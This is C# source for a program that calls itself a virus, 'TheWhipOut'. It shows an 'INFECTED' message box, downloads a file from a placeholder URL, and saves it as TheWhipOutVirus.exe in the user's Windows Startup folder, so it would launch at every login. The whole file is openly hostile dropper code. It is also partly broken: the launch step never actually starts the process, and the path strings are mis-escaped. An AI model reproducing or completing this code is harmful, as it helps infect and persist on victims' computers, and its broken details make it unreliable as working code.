using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TheWhipOut_
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            //Strings And Shit

            string username = Environment.UserName;
            
            string StartUp = @"C:\\Users\\"+ username +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

            String WhipOutDownload = "";
            


            //Download and Send Virus To StartUp


            //MessageBox Of Doom

            MessageBox.Show("You Have Been INFECTED By THE WHIP OUT!!");

            
            
            
            
            
            try
            {


                if (File.Exists(@StartUp + "TheWhipOutVirus.exe"))
                {


                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.EnableRaisingEvents = false;
                    proc.StartInfo.FileName = (@StartUp + "TheWhipOutVirus.exe");


                }

                else
                {
                    //Downloading The File

                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("URL", @StartUp + "TheWhipOutVirus.exe");

                    //Running The file...

                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.EnableRaisingEvents = false;
                    proc.StartInfo.FileName = (@StartUp + "TheWhipOutVirus.exe");

                }

            }

            catch (Exception E)
            {
             

                MessageBox.Show("Damm You Beat TheWhipOut This is how:" + E.Message);

            }
        }
    }
}
